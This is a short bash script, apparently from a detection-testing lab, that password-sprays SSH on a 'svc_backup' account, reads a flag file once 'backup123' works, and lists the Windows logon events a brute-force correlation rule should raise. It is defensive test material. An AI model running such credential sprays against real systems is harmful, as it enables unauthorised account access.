#!/usr/bin/env bash
# Alternate initial access — SSH password spray against svc_backup.
# Competition red teams rarely brute force SSH (too noisy for too little),
# so this is NOT part of run-all.sh; run it by hand when you want to watch
# elmer's brute-force correlation fire.
set -euo pipefail
. "$(dirname "$0")/lib.sh"

need ssh "openssh client"
command -v sshpass >/dev/null 2>&1 || need expect "macOS ships expect; linux: apt install sshpass"

say "brute forcing svc_backup@$TARGET"
for pw in admin123 'P@ssw0rd' backup2024 letmein changeme qwerty123 'Backup!23'; do
  if ssh_try svc_backup "$pw" true; then
    die "the decoy password '$pw' worked — provision.ps1 drifted?"
  fi
  note "rejected: $pw"
done

say "next candidate: backup123"
ssh_try svc_backup backup123 'cmd /c whoami & type C:\Users\svc_backup\flag.txt'

note "expected on the target:"
note "  auth MEDIUM  logon failure 4625 — one per bad password (7 total)"
note "  auth MEDIUM  brute-force correlation at 5 failures / 2m (bump the"
note "               loop past 20 for the High escalation)"
note "  auth INFO    logon 4624 once backup123 lands"
